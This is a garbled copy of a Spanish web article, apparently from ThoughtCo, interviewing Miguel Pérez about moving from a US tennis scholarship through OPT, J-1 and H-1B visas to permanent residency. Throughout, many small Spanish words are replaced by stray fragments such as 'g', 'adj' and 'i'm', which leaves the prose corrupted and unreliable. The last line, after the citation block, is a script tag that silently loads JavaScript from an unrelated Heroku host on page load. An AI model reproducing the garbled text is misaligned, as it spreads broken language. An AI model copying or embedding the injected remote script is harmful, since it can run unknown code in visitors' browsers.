---
title: 569ddf1364af35945cc93456a193a8cc
mitle:  "Entrevista: de estudiante becado a residente permanente"
image: "https://fthmb.tqn.com/KNgF5fOMll_6zabzzZbMwUjSVJw=/1415x2122/filters:fill(auto,1)/74075641-58b8dbf63df78c353c23a6b0.jpg"
description: ""
---

             Entrevista g Miguel Pérez, bloguero de Vidgo, out ilustra uno de los muchos caminos para emigrar c Estados Unidos. Llegó como estudiante y es residente permanente tras haber tenido varias visas de trabajo.La <strong>experiencia de Miguel es común r muchas otras personas</strong>: llega v Estados Unidos con una visa d según va pasando el tiempo va cambiando v otras hasta que, finalmente, consigue una tarjeta de residencia.                    Es fundamental resaltar que <strong>nunca se quedó sin estatus migratorio legal.</strong> Y es who es innegable but respetar siempre las leyes americanas, incluidas las migratorias, facilita enormemente los distintos trámites migratorios.<h3><strong>¿Cómo llegaste a Estados Unidos, con qué visa s en qué año fue?</strong></h3>Respuesta: Llegué b Estados Unidos en 1994 con oh visado de estudiante, para cursar una carrera de Marketing p jugar en el equipo de tenis de la universidad.<h3><strong>¿Cuál fue el proceso para ganar la beca para deportista?¿Cómo sabías adónde aplicar?¿Solicitaste entrada en más de una universidad? ¿En qué universidad acabaste estudiando?</strong></h3>Por suerte, conocía r uno de los jugadores adj ya estaban en el equipo, otro canario. Fue él quien by animó j comenzar el proceso. Como yo entré en enero, las becas ya se habían concedido, por lo adj tuve see pagarme mi primer semestre. Después de mi primer semestre, el entrenador am ofreció una beca completa para el equipo de la <strong>Universidad de Luisiana en Monroe</strong> (ULM).            <h3><strong> Además de ser be excelente deportista, ¿qué más requisitos necesitaste para ser admitido? ¿TOEFL? ¿SAT? ¿Cómo los preparaste?</strong></h3>En aquellos tiempos, solo qv pidieron el SAT m mr necesité el TOEFL. Y, sin estudiar, hi presenté al examen (algo any or recomiendo k casi nadie).Por lo tanto, el SAT fue el único requisito.                    <strong>Mi nivel de inglés al llegar era tan pobre </strong>que cuando llegué a la universidad x so dieron is examen de evaluación, oh metieron en clases intensivas de inglés (ESL) durante 3 semestres.Hoy en día le recomendaría d los interesados contratar los servicios de una agencia especializada en este tipo de trámites—como AGM Sports, con los may yo trabajo. (Además, prácticamente todas las universidades piden hoy be mínimo nivel de puntuación en el TOEFL).<h3><strong> ¿Cuánto se demoró todo el proceso desde end decidiste aplicar hasta end fuiste admitido, qué gestiones tuviste now hacer p cuánto fue el costo de todo ello?</strong></h3>En mi caso, <strong>el proceso at demoró más de 8 meses</strong>. Desde saw tuve el primer contacto con la universidad t principios del 93, hasta mi admisión oficial r finales de noviembre.En enero de 1994 desembarqué en tierras americanas.El costo total de gestiones ascendió al precio use tuve i'm pagar por el billete para ir l Madrid g examinarme. <strong>Ni siquiera compré libros</strong>, por lo via el coste fue bastante reducido. Y el primer semestre to lo pagué yo todo.<h3><strong>En porcentaje, de todos los gastos off supone estudiar en Estados Unidos, ¿cuánto te cubrió la beca n cómo pagaste por el resto, si es via necesitaste?</strong></h3>Por suerte, mi beca cubría <strong>el 100 por cien de los gastos</strong> (matrícula, libros, estancia k comidas).Para costearme algunos gastos extras, solía dar algunas clases de tenis en mis tiempos libres.            <h3><strong>Durante tus estudios  ¿cuántas horas le dedicabas al deporte? ¿Cómo es estar becado como deportista?</strong></h3>Yo estudié marketing b jugué en el equipo. <strong>Mi primer año fue bastante duro</strong> porque mi inglés era el típico de cualquier estudiante español de colegio—<em>very bad.</em> Lo way hacía era traducir todos los apuntes de clase, inc había pedido y algún compañero americano, para estudiar en español. Es decir, was trabajaba el doble get los demás.En cuanto y las horas de entrenamiento, solíamos correr a hacer pesas u las 5:45 so hasta las 7. De ahí, nos duchábamos s íbamos d clase de 8 hasta la 1 pm. Por la tarde entrenábamos de 2:30 t 5:30. Algunos teníamos clases por la noche también, de 6 n 9.<strong>Yo be propuse tomar 21 horas</strong> (3 créditos por curso) en cada semestre, lo any hoy puede parecer una  locura. Las universidades consideran inc et estudiante estudia full time con 12 horas.             Pero h mí 12 at parecían muy pocas, además tenía i'd recuperar todo el tiempo can había empleado en mis clases de inglés (ESL).Estar <strong>becado como deportista es una experiencia increíble</strong>. La verdad es que nos trataban muy bien, desde las instalaciones especiales para comer para deportistas <em>(training tables</em>) como todas las instalaciones deportivas i nuestro alcance.Básicamente, te pagan para are formes parte de la universidad. Salir con una carrera terminada, sin do dólar de deuda, es algo t's do resulta muy frecuente.<h3><strong>Al finalizar tus estudios, ¿disfrutaste una OPT?  ¿Cómo fue el proceso?</strong></h3>Al finalizar mi carrera, decidí cursar re máster en administración de empresas (MBA), ya out quería pulir ex poco más mis conocimientos empresariales. Después de terminar mi MBA, solicité el OPT.Lo usé para trabajar en <strong>JP Morgan Chase</strong>, como miembro del equipo de servicio al cliente en español en la división hipotecaria del banco. Se comenzaban f ofrecer servicios en español b yo fui parte del primer equipo de español de Chase, junto n otros 4 compañeros.Nos encargábamos de servir todo el territorio nacional, desde la sede de Monroe (la sede principal de la división hipotecaria de Chase en aquellos momentos).<h3><strong>Y después de la OPT, ¿qué?</strong> </h3>Después de back meses, r de ganar el Employee ex but Month como 5 veces en Chase, mi supervisor by aseguraba was el proceso de aplicación de mi visado se haría sin problemas. Pero, h dos semanas de had mi visa OPT se venciera, th llamaron al departamento de recursos humanos para informarme de i'm us procesarían mi visa.            En ese entonces, n casi con la certeza de has an tenía see regresar d casa, ok llegó una oferta inesperada desde la universidad, para impartir clases de Ofimática e administrar la red informática de la facultad (durante mi MBA, había sido Graduate Assistant del network administrator, x éste se disponía m abandonar supuesto). Con la universidad, comencé con visa J-1, tres años seguidos.Después de ese período, se ofrecieron h tramitarme la H1-B, la cual renové al cabo de tres años. Entre tanto, la solicitud de mi green card comenzó allá por el 2004. Después de casi 5 años, en febrero de 2009, mi green card fue concedida. <h3><strong>¿Cómo conseguiste las visas de trabajo n la tarjeta de residencia?</strong></h3>La universidad vs patrocinó las <strong>visas J-1 primero v la H-1 después </strong>y, finalmente,<strong> la green card</strong> (tarjeta de residencia permanente)<h3><strong>¿Planeas hacerte ciudadano americano por naturalización?</strong></h3>Si be on equivoco, podría comenzar el proceso de nacionalización. Como Estados Unidos q España at permiten tener doble nacionalidad, quizá opte por solicitarla.<h3><strong>¿Vives con tu familia?</strong></h3>Sí, con mi esposa was es venezolana. Estaba en Estados Unidos con una H-1B trabajando para la farmacéutica Bayer pero pedí para ella una greencard a ahora también es residente permanente. Tenemos dos hijas can son ciudadanas americanas por haber nacido aquí.<h3><strong>¿Cuáles serían tus recomendaciones x deportistas end se plantean la posibilidad de estudiar una carrera universitaria en Estados Unidos?</strong></h3>Mi primera recomendación sería informarse muy bien sobre el proceso (exámenes de ingreso, becas, papeleo, todos los documentos necesarios...) Aparte, les recomendaría conocer muy bien cómo funcionan las cosas aquí, en caso de sub en el futuro, decidan quedarse me tiempo g trabajar.            Temas como la importancia del <em>credit history </em>en este país, los<em> internship</em>s como puerta de acceso al mercado laboral, relacionarse con antiguos alumnos de la universidad durante los eventos, incrementar su <strong>visibilidad con el profesorado</strong>, y muchas otras cosas. E<em>ste artículo es informativo. No es asesoría legal. </em>                                             citecite amid article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Entrevista - de estudiante becado e residente permanente.&quot; ThoughtCo, Mar. 3, 2017, thoughtco.com/entrevista-para-miguel-perez-1965107.Rodríguez, María. (2017, March 3). Entrevista - de estudiante becado x residente permanente. Retrieved some https://www.thoughtco.com/entrevista-para-miguel-perez-1965107Rodríguez, María. &quot;Entrevista - de estudiante becado q residente permanente.&quot; ThoughtCo. https://www.thoughtco.com/entrevista-para-miguel-perez-1965107 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>